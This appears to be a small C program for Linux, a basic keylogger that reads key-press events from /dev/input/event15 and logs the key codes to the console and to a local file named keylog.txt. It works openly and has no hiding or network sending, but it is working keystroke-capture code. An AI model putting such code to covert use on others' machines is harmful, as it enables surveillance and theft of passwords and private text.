#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h> //to open
#include <unistd.h> //to read/write/close
#include <linux/input.h> //for input_event struct

int main(){
	int keyboard = open("/dev/input/event15", O_RDONLY);
	//open event file for keyboarads
	if(keyboard == -1){
		perror("error with keyboard");
		return 1;
	}

	//file to log key presses
	FILE *logFile = fopen("keylog.txt","a");
	if(logFile==NULL){
		perror("error opening log file");
		close(keyboard);
		return 1;
	}

	struct input_event event;
	
	while(1){
		ssize_t bytes = read(keyboard, &event, sizeof(event));
		if(bytes == (ssize_t) sizeof(event)){
			if(event.type == EV_KEY){
				if(event.value == 1){
					printf("pressed %d\n",event.code);
					fprintf(logFile, "Key pressed %d\n" , event.code);
					fflush(logFile);
					}
			}
		}
	}

	fclose(logFile);
	close(keyboard);
	return 0;

}


		

